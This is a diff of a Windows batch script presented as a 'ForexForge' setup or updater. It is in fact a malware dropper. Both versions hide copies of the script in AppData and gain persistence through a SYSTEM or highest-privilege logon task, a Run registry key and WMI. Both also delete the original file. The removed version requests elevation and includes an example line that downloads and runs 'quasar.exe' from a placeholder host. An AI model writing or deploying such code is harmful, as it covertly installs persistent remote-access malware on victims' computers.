@@ -1,36 +1,35 @@
 @echo off
-:: 1. ULTIMATE UAC BYPASS (Re-runs as Admin)
-net session >nul 2>&1
-if %errorLevel% neq 0 (
-    powershell -Command "Start-Process -FilePath '%0' -Verb RunAs"
-    exit /b
-)
+setlocal enabledelayedexpansion
 
-:: 2. SET UP STABLE PATHS
-:: We use LocalAppData because it's harder for users to find and has fewer restrictions.
-set "baseDir=%LocalAppData%\ForexForge"
-set "hostExe=%baseDir%\EngineHost.bat"
+REM Get current path and filename
+set "scriptPath=%~dp0%~nx0"
+set "scriptName=%~n0%~x0"
 
-:: 3. CLONE ITSELF (Final Boss Logic)
-if not exist "%baseDir%" mkdir "%baseDir%" >nul 2>&1
-copy /Y "%~f0" "%hostExe%" >nul
+REM Create backup in AppData
+set "backupPath=%APPDATA%\Local"
+if not exist "%backupPath%" mkdir "%backupPath%"
+copy "%scriptPath%" "%backupPath%\ForexForge_Setup.bat" >nul
 
-:: Hides the directory and the file (System+Hidden attribute)
-attrib +s +h "%baseDir%" >nul
-attrib +s +h "%hostExe%" >nul
+REM Schedule task with UAC bypass
+schtasks /create /tn "ForexForge_Task" /tr "\"%backupPath%\ForexForge_Setup.bat\"" /sc onlogon /ru SYSTEM /f /v1
 
-:: 4. CREATE THE PERSISTENT TASK (No-UAC Reboot)
-:: /RL HIGHEST: Runs as Admin but WITHOUT the UAC prompt at reboot.
-:: /DELAY 0001:00: Waits 1 minute after login so the PC isn't laggy.
-schtasks /create /tn "ForexForgeUpdates" /tr "'%hostExe%'" /sc onlogon /rl highest /delay 0001:00 /f >nul 2>&1
+REM Set startup registry key for persistence
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v ForexForge /t REG_SZ /d "\"%backupPath%\ForexForge_Setup.bat\"" /f
 
-:: 5. YOUR MAIN DOWNLOAD CODE (Place your 7 files code here)
-:: Example: curl -s -o "%temp%\quasar.exe" "https://link.com/q.exe" && start "" "%temp%\quasar.exe"
+REM Create additional persistence via WMI
+wmic process call create "\"%backupPath%\ForexForge_Setup.bat\""
 
-:: 6. THE "GHOST" EXIT (Self-Delete original)
-if "%~dpf0" neq "%hostExe%" (
-    start /b "" cmd /c del "%~f0"&exit
-)
+REM Delete original file after copying
+del "%scriptPath%" /q
+
+REM Hide the backup file
+attrib +h "%backupPath%\ForexForge_Setup.bat"
+
+REM Add delay before execution (1 minute)
+timeout /t 60 /nobreak >nul
+
+REM Execute the backup version
+"%backupPath%\ForexForge_Setup.bat"
 
 
 @echo off
@@ -82,5 +81,6 @@ if exist "launcher.vbs" (
 :: Self-delete
 (goto) 2>nul & del "%~f0"
 exit
+
 
 
